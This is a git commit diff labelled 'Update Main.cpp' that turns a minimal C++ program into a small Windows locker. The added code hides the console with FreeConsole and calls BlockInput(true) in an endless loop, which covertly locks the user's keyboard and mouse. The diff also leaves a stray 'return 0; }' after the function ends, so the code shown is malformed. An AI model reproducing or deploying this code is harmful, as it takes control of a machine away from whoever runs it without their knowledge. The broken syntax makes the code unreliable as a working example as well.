5075df96d329cfabcadb1c1e4f2aefa9e39ebd81
Syriamanal <shadinachat123@gmail.com>
2015-05-18 07:57:25 -0700

    Update Main.cpp

--- Main.cpp
+++ Main.cpp
@@ -1,9 +1,15 @@
 #include <iostream>
+#include <windows.h>
 
 using namespace std;
 
-int main()
-{
+int main(){
+  FreeConsole(); //Hides Console
+  
+  while(1){
+    BlockInput(true); //Blocks All Input
+  }
+}
 
 return 0;
 }
